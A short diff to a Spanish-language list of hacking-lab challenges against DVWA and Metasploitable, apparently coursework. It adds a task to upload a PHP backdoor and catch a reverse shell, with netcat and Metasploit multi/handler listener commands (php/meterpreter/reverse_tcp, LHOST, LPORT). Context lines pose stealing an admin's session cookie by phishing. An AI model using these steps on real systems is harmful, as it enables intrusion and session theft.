@@ -120,8 +120,24 @@ Identificar la url
 del login de DVWA
 http// dvwa.seginfo.co
 
+solucion automatica dirbuster
+                    gobuster
+
 Reto4
 Robar la cookie de sesion de Javier Dúran
 (usuario:admin) via phishing
 Pista: A Durán le gustan los viajes
 PDT: mostrar la sesión
+
+Reto5 (media)
+Creaar payload
+reverse_tcp
+A través de la vul upload backdoor de Dwva GANAR UNA SESION DE SHELL DE METASPLOITABLE POR MEDIO DE UN PAYLOAD BACKDOOR php
+NOTA: LA SESIONSHELL DEBE MOSTRAR EL NOMBRE DE METAPLOITABLE AL EJECUTAR COMANDO HOSTNAME
+
+nc -l -p 4444
+nmap localhost -p 4444
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 10.2.13.215
+SET LPORT 4444
